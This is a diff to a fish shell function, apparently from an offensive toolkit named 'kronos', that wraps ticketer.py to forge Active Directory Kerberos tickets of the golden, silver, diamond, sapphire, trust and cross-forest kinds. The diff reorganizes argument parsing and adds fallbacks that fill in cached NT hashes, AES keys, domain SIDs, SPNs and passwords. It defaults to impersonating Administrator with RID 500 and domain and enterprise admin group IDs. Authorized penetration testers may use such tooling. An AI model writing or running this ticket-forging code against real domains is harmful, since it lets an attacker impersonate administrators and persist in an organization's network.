@@ -1,24 +1,8 @@
 # description: Create Golden, Silver, Diamond, Sapphire, Trust, and Cross-Forest Tickets
 function __kronos_ticket --description "Create advanced AD tickets using ticketer.py"
-    set -l subaction $argv[1]
-    set -l wizard 0
     set -l ticket_types golden silver diamond sapphire trust cross-forest
     
-    if test -z "$subaction"
-        set subaction (__kronos_ask_choice "Pick a ticket type to forge" "golden" $ticket_types); or return 1
-        set wizard 1
-    end
-
-    if contains -- "$subaction" $ticket_types
-        if not set -q _flag_quiet
-            set wizard 1
-        end
-        # Only remove if it was explicitly passed as an argument
-        if test (count $argv) -gt 0; and test "$argv[1]" = "$subaction"
-            set -e argv[1]
-        end
-    end
-
+    # Run argparse FIRST so we know if -q is set
     argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= E/extra-sid= q/quiet -- $argv
     or return 1
 
@@ -31,6 +15,23 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         echo "  -q, --quiet          Skip prompts and use cached/default values"
         echo "  -h, --help           Show this help message"
         return 0
+    end
+
+    set -l subaction $argv[1]
+    set -l wizard 0
+    
+    if test -z "$subaction"
+        if not set -q _flag_quiet
+            set subaction (__kronos_ask_choice "Pick a ticket type to forge" "golden" $ticket_types); or return 1
+            set wizard 1
+        else
+            echo "error: subcommand required in quiet mode (e.g. kronos ticket golden -q)" >&2
+            return 1
+        end
+    else if contains -- "$subaction" $ticket_types
+        if not set -q _flag_quiet
+            set wizard 1
+        end
     end
 
     # Capture flags
@@ -78,11 +79,11 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
         set -U __KRONOS_CACHE_SID "$sid"
 
-        # 4. Domain Name (FQDN)
+        # 4. Domain Name
         set -l def_domain "$__KRONOS_CACHE_DOMAIN"
         if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
         if test -n "$domain"; set def_domain "$domain"; end
-        set domain (__kronos_ask "Domain Name (FQDN)" "$def_domain"); or return 1
+        set domain (__kronos_ask "Domain Name" "$def_domain"); or return 1
         set -U __KRONOS_CACHE_DOMAIN "$domain"
 
         # 5. User to Impersonate
@@ -167,14 +168,44 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     else
         # Standard Fallbacks
         if test -z "$domain"; set domain "$__KRONOS_CACHE_DOMAIN"; end
-        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
+        if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
         if test -z "$sid"; set sid "$__KRONOS_CACHE_SID"; end
         if test -z "$hash"; set hash "$__KRONOS_CACHE_HASH"; end
-        if test -z "$hash"; set hash "$TGT_PASSWORD"; end
-        if test -z "$hash"; set hash "$TGT_CRED_PASSWORD"; end
+        if test -z "$hash"; set hash $TGT_PASSWORD; end
+        if test -z "$hash"; set hash $TGT_CRED_PASSWORD; end
         if test -z "$user"; set user "$__KRONOS_CACHE_USER"; end
         if test -z "$user"; set user "Administrator"; end
         if test -z "$aes_key"; set aes_key "$__KRONOS_CACHE_AES_KEY"; end
+        if test "$subaction" = "cross-forest"; and test -z "$extra_sid"; set extra_sid "$__KRONOS_CACHE_EXTRA_SID"; end
+        if contains -- "$subaction" silver trust; and test -z "$spn"; set spn "$__KRONOS_CACHE_SPN"; end
+        if contains -- "$subaction" diamond sapphire
+            if test -z "$auth_user"; set auth_user "$__KRONOS_CACHE_AUTH_USER"; end
+            if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
+            if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
+
+            if test -z "$auth_pass"; and test -z "$auth_hash"
+                set -l cached_auth "$__KRONOS_CACHE_AUTH_VAL"
+                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$cached_auth"
+                    set auth_hash "$cached_auth"
+                else
+                    set auth_pass "$cached_auth"
+                end
+            end
+            if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_PASSWORD; end
+            if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_CRED_PASSWORD; end
+
+            if test -z "$user_id"
+                if test "$subaction" = "sapphire"
+                    set user_id "$__KRONOS_CACHE_LOWPRIV_RID"
+                else
+                    set user_id "$__KRONOS_CACHE_USER_ID"
+                    if test -z "$user_id"; set user_id "500"; end
+                end
+            end
+
+            if test "$subaction" = "diamond" -a -z "$groups"; set groups "$__KRONOS_CACHE_GROUPS"; end
+            if test "$subaction" = "diamond" -a -z "$groups"; set groups "512,513,518,519,520"; end
+        end
     end
 
     # Validation
@@ -202,7 +233,6 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set -a ticket_args -dc-ip "$TGT_DC"
     end
 
-    set -l impersonate_user "$user"
     set -l final_user "$user"
 
     switch "$subaction"
